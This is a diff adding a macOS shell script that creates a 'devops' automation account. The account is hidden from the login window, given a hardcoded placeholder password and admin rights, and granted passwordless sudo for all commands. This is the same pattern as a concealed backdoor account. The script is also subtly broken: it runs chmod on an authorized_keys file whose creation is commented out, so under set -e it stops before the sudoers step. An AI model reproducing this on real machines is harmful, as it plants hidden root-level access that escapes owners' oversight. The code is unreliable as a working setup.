@@ -1,0 +1,36 @@
+#!/bin/bash
+
+set -e
+
+# Create the record
+dscl . -create /Users/devops
+dscl . -create /Users/devops UserShell /bin/zsh
+dscl . -create /Users/devops RealName "Dev Ops"
+dscl . -create /Users/devops UniqueID "503"
+dscl . -create /Users/devops PrimaryGroupID 20
+dscl . -create /Users/devops NFSHomeDirectory /Users/devops
+
+# Hide the user from the macOS Login Window
+dscl . -create /Users/devops IsHidden 1
+
+# Set a temporary password (or use keys later)
+dscl . -passwd /Users/devops "YourSecurePassword"
+
+# Grant Admin rights
+dseditgroup -o edit -a devops -t user admin
+
+# Create the home folder skeleton
+createhomedir -c -u devops
+
+# Set up the .ssh directory
+mkdir -p /Users/devops/.ssh
+chmod 700 /Users/devops/.ssh
+
+# Add your public key (replace 'ssh-rsa AAA...' with your actual key)
+# echo "ssh-rsa YOUR_PUBLIC_KEY_HERE" | tee /Users/devops/.ssh/authorized_keys
+
+# Fix ownership so the automation user can read their own keys
+chown -R devops:staff /Users/devops/.ssh
+chmod 600 /Users/devops/.ssh/authorized_keys
+
+echo 'devops ALL=(ALL) NOPASSWD: ALL' >/etc/sudoers.d/devops
